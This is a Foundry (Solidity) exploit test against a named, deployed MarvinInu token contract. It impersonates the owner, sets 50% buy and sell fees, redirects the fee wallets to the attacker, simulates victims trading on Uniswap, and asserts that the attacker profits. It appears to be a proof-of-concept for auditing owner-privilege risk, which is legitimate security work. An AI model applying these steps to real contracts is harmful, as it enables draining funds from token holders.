import "forge-std/Test.sol";

// Minimal IERC20 interface for approvals
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// Interface for UniswapV2Router02 to call swap functions
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// Minimal MarvinInu interface
interface MarvinInu {
    function owner() external view returns (address);
    function enableTrading() external;
    function updateBuyFees(uint256, uint256, uint256) external;
    function updateSellFees(uint256, uint256, uint256) external;
    function updateMarketingWallet(address) external;
    function updateDevWallet(address) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function swapTokensAtAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get contract instance and identify owner
        MarvinInu target = MarvinInu(TARGET);
        owner = target.owner();

        // Label addresses for clarity
        vm.label(address(target), "MarvinInu Token");
        vm.label(owner, "Original Owner");

        // Store initial attacker balance for profit calculation
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceLocal = address(this).balance;
        MarvinInu target = MarvinInu(TARGET);

        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Enable trading if not already enabled (check state if possible)
        target.enableTrading();

        // Step 3: Set fees to maximum (50% total)
        // Distribute as: marketing 25%, liquidity 15%, dev 10% (sums to 50%)
        target.updateBuyFees(25, 15, 10);
        target.updateSellFees(25, 15, 10);

        // Also update marketing and dev wallets to attacker address for direct collection
        target.updateMarketingWallet(attacker);
        target.updateDevWallet(attacker);

        vm.stopPrank();

        // Step 4: Create victim addresses and fund them with ETH and MARVIN tokens
        address victim1 = address(0x111);
        address victim2 = address(0x222);

        // Give victims ETH for buying
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);

        // Give victims some MARVIN tokens for selling
        // First, get some tokens from owner (who has all supply)
        vm.startPrank(owner);
        target.transfer(victim1, 100_000 * 1e18);
        target.transfer(victim2, 100_000 * 1e18);
        vm.stopPrank();

        // Step 5: Victims buy tokens (pay ETH, get tokens with 50% fee)
        // Need to interact with Uniswap pair directly
        // First, approve router for victims
        vm.startPrank(victim1);
        IERC20(address(target)).approve(address(target.uniswapV2Router()), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim2);
        IERC20(address(target)).approve(address(target.uniswapV2Router()), type(uint256).max);
        vm.stopPrank();

        // Create swap path
        address[] memory path = new address[](2);
        path[0] = target.uniswapV2Router().WETH();
        path[1] = address(target);

        // Victim1 buys tokens
        vm.startPrank(victim1);
        target.uniswapV2Router().swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 1 ether
        }(0, path, victim1, block.timestamp);
        vm.stopPrank();

        // Victim2 buys tokens
        vm.startPrank(victim2);
        target.uniswapV2Router().swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 1 ether
        }(0, path, victim2, block.timestamp);
        vm.stopPrank();

        // Step 6: Victims sell tokens (pay tokens, get ETH with 50% fee)
        // Reverse path for selling
        path[0] = address(target);
        path[1] = target.uniswapV2Router().WETH();

        // Get victim token balances
        uint256 victim1Balance = target.balanceOf(victim1);
        uint256 victim2Balance = target.balanceOf(victim2);

        // Victim1 sells half of tokens
        vm.startPrank(victim1);
        target.uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
            victim1Balance / 2,
            0,
            path,
            victim1,
            block.timestamp
        );
        vm.stopPrank();

        // Victim2 sells half of tokens
        vm.startPrank(victim2);
        target.uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
            victim2Balance / 2,
            0,
            path,
            victim2,
            block.timestamp
        );
        vm.stopPrank();

        // Step 7: Trigger swapBack() if enough tokens accumulated
        // The contract should automatically trigger swapBack when token balance >= swapTokensAtAmount
        // We can help by transferring more tokens to contract to reach threshold
        uint256 swapThreshold = target.swapTokensAtAmount();
        uint256 contractBalance = target.balanceOf(address(target));

        if (contractBalance < swapThreshold) {
            // Transfer more tokens from owner to contract to trigger swap
            vm.startPrank(owner);
            target.transfer(address(target), swapThreshold - contractBalance);
            vm.stopPrank();

            // Trigger swap by transferring tokens (any transfer from non-excluded address to non-excluded address)
            // Use a dummy address
            address dummy = address(0x333);
            vm.startPrank(owner);
            target.transfer(dummy, 1);
            vm.stopPrank();
        }

        // Step 8: Collect ETH from marketing/dev wallets (now set to attacker)
        // The ETH should already be sent to attacker address during swapBack
        // Verify profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalanceLocal, "Attacker balance should increase");
        assertGt(finalBalance, initialBalanceLocal, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

